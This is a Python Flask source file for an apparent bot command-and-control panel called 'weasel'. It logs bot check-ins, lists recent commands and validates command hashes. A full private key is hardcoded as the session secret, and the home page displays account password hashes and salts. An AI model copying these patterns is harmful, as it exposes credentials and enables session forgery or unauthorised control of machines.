import flask, os
from flask import Flask, request, render_template, flash, redirect
from flask.ext.login import LoginManager, login_required, login_user
from weasel.engine.manager import BotManager
from weasel.shared.config import EngineConfig
from weasel.engine.dbmanager import DatabaseManager
from weasel.engine.accounts import AccountManager, User
import sys, logging

def read_private_key(config):
    """ Reads the private key required for secure sessions"""
    with open(config.key_file, 'r') as key_file:
        lines = key_file.readlines()
        return lines[2]

logging.basicConfig()
application = Flask(__name__)
config = EngineConfig("/home/dan/Dropbox/Weasel/weasel.conf")
#application.secret_key = read_private_key(config)
application.secret_key="MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPCC/0p+BDckEmFRdcdun9lWFt09P6jjYBC9iCsnfZSgdA34ADb3EDEWsTnFl6ATGq3XlGxkY1lHX8quq1coHtB6eUzlNZo1kZrQtrPU5EVCDPtgAkTv4MPlCl7Z61IxWKWW8vKk9uHUUuygxvhOO/w0FpcGSKL19vtQDo8FunYxr+29COXnKcSafbcY9/8SpUG5XVY5TPZ1QwUngHgdwvbJzdjnpegQ1fgAbBwv/CqXxx5/zPL0EcWabyDt/9o2GtO0GxB+RneHpIOf5qczDR6GxsEzbyji/zlsIOJ1YOkjk23MtRZJdHzzUWPo2dfAFZ6lrbK1Ohu8Qo0kXTXbu1AgMBAAECggEBAJL8TBfWDEm2V3yzIrfaETyhjt+LsgdEaiEKCPiZvq89eLLdOyS1PTYharUsnvYY3OtjfFP8NyKZOb9elW6nUok3kwn6BoEwkPTCv8Wua9/lHrp5i9Y7YvDMWTPE5ZXSx9tGrcJ9tpEGJPUYLAYNAilGdi1mx2q4QXisuG2pIFlQoiYNqw6bzAi5NWGBS7CRqg+GpXcgNzRXa+a51Gt92E0g60xWTEGg3e6xLy+5HQmp/KdgcfaFGGLKGmFMD4wsF57lrizrpX6zUSzgDBl6El7dK4Z19hcVwGN6KxsTDhhdzeIYnwFFP+g/5S5moc6ZaQT/cucpI4d0w6od4eFacWECgYEA/N+ggcIAbV+vCDEKPM24wT3Fjb2EcIy7+4YHcPmjIpYoJ+w/QkhR0J6HTHsFpcROP79aiQCkkgscWKBfjcn1AKpi2KCAVlhWpRvgccJhKmatbLm8xtc/cnWKMY5i2R6kfAku2cCIVWZZUSvz026qeLoKplF6Y8dWHHnB++G5rI0CgYEA0Zd3eJFLLwsL8PEjbY6ypjUSUFAi5AnllUYZQCsIzKyRKDYJVesqBLU5a5DmEp+igIYAtIr6P0/98dF0P2DhslzpGO+6V1F/ZkOT6gnEe0OXaxi8t06dNNKjb4ISbBJJ80CJkG9kAX/sUTnpXRxXfdxG8buOGEXLHwheQcWwhckCgYEA6ViDCLo5IrS1E94NEGbWIpwZ/N3xpNp5bXUU0M/MFlJx48VB6qxJszVWrOCpKXqoqnKt3NbXBl1yXuY+xtyiVWblp/kT9Jm3+sxqpQ82EqaFSltrNCHUzo5gY7J8zNZV+o+OyCm+pO+5ZAonCeiJLraetTNiuUhs0gIZW5HEgNECgYAxT5yZLj3tHIE7t9ApB4i6mAPuB1yeIEH2o95u/XD9jqA8QLJjl4d0Qhr3Vsj6mrpF2MEzuPr1iGFr0mayPp37M+bXqhdCUfdSXRXg21lx0s4+MTy9N+6+rcwsAQNKj+b8JzP2Wm7B95Hm7mQcNv3Sq8+5MfJVfZ4zd+mNOfC1GQKBgCDogZGAhbwXMbGQiah14iShaWqtwj5bUWgwXCSEuiCkWLt/Z23mcG569Mb+3+kC0lIvO2xBy9a2fc1I1cRMJ4QSh4k/2aCu547H5JCm7Hw2VGyhKLm8x7Q67p2ZBhgFnCTzWDhVU/FbuRaVrXnANuNxCFaF/97a6l9xED9YfaQH"

act_mgr = AccountManager(config)
bot_mgr = BotManager(config)
db_mgr = DatabaseManager(config)

login_mgr = LoginManager()
login_mgr.setup_app(application)

login_mgr.login_view = "login"
login_mgr.login_message = u"You must login to continue"

@login_mgr.user_loader
def load_user(userid):
    return act_mgr.get_user(userid)

@application.route("/")
@login_required
def home_page_view():
    status_rows = db_mgr.exec_query('''select ip, last_startup_time, 
                                last_activity_time, last_shutdown_time,
                                port, message
                                from bot_status''')
    user_records = db_mgr.exec_query('''select ip, hash, salt from account''')
    command_records = db_mgr.exec_query('''select command_id, time, content 
                                    from command_log order by time desc limit 20''')
    return render_template('home_template.pt', user_records = user_records, 
                                               command_records = command_records,   
                                               status_records=status_rows)

@application.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    next = request.args.get('next')

    # post means the login form was submitted
    if request.method == 'POST':
        password = request.form['password']

        if act_mgr.test_authentication(request.remote_addr, password):
            user = act_mgr.set_logged_in(request.remote_addr)
            login_user(user)
            flash('Login successful')
            return redirect(next or '/')
        error = "Login failed"
    # re-render the login form on failure, or display for the first time
    return render_template('login.pt',next=next, error=error)

@application.route("/notify", methods=['GET'])
def notify():
    """ Handles status updates from bots
        Status should be one of startup, shutdown, ping, or activity
    """
    status = request.args['status']

    port = -1
    if 'port' in request.args:
       port = request.args['port'] 

    message = ""
    if 'message' in request.args:
        message = request.args['message']

    ip = request.remote_addr
    bot_mgr.handle_update(ip, status, port, message)
    return "Updated status of bot {0} to {1}, {2}, {3}".format(ip, status, port, message)

@application.route("/validate", methods=['GET'])
def validate():
    """ Determines if the specified MD5 hash 
        matches the content of commands in the past 10 seconds """
    hash = request.args['command']
    return str(bot_mgr.validate_command(hash))

if __name__ == "__main__":
    application.run()
